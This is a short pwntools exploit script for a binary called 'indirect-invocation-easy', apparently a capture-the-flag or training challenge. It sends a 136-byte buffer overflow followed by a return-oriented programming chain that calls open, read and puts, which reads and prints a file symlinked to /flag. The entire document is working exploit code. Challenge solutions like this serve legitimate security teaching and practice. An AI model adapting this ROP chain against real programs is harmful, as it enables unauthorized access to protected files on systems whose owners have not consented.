from pwn import * 

exe = ELF("./indirect-invocation-easy")

context.binary = exe

gdb_script="""
b main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r


offset = 136
pop_rdi = 0x401a78
pop_rsi = 0x401a80
pop_rdx = 0x401a68

puts_plt = exe.plt['puts']
read_plt = exe.plt['read']
open_plt = exe.plt['open']
bss = exe.bss()
flag = 0x402004 # Leaving! and create a simlink that points to /flag on the machine

def main():
        r = conn()
        log.info(f"pid => {r.pid}")
        pause()
        payload = flat(
        b'A'*offset,
        # open the file
        pop_rdi,
        flag,
        pop_rsi, 0,
        open_plt,
        # read the file
        pop_rdi, 3,
        pop_rsi, bss+0x100,
        pop_rdx, 0x100,
        read_plt,
        # and print the file
        pop_rdi, bss+0x100,
        puts_plt
        )
        r.sendline(payload)
        r.interactive()

if __name__ == "__main__":
    main()
